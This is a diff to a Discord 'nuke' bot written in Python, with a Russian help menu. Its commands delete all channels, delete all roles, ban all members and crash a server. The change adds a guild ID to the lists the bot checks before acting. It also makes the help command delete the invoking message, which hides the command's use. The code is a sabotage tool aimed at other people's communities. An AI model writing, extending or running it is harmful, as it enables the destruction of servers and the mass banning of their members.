@@ -16,7 +16,7 @@ dr = []
 bl = []
 crserv = []
 
-g = [747500947911213249, 779094480900194324]
+g = [747500947911213249, 779094480900194324, 764781234810650664]
 
 @Bot.command()
 async def delchannels(ctx):
@@ -43,7 +43,7 @@ async def delroles(ctx):
  guild = ctx.guild
  author = ctx.author
  roles = guild.roles
- g = [747500947911213249,776803884764889128]
+ g = [747500947911213249,776803884764889128, 764781234810650664]
  if guild.id not in dr:
    dr.append(guild.id)
    if guild.id in g:
@@ -64,7 +64,7 @@ async def banall(ctx):
  guild = ctx.guild
  members = guild.members
  author = ctx.author
- g = [747500947911213249,776803884764889128]
+ g = [747500947911213249,776803884764889128, 764781234810650664]
  if guild.id not in bl:
   bl.append(guild.id)
   if guild.id in g:
@@ -89,7 +89,7 @@ async def crash(ctx):
  roles = guild.roles
  author = ctx.author
  gid = ctx.guild.id
- g = [747500947911213249,776803884764889128]
+ g = [747500947911213249,776803884764889128, 764781234810650664]
  if guild.id not in csrl:
   csrl.append(guild.id)
   if guild.id in g:
@@ -142,7 +142,7 @@ async def help(ctx):
     owner = guild.owner
     embed = discord.Embed(title='Помощь', description="!delchannels - удалить все каналы\n!delroles - удалить все роли\n!banall - забанить всех\n!crash - крашнуть серв\n!help - посмотреть список команд", timestamp=ctx.message.created_at, color=discord.Color.red())
     await ctx.author.send(embed=embed)
-    await ctx.send("Я отправил вам команды в личку:D")
+    await ctx.message.delete()
     
 
 Bot.run(token)
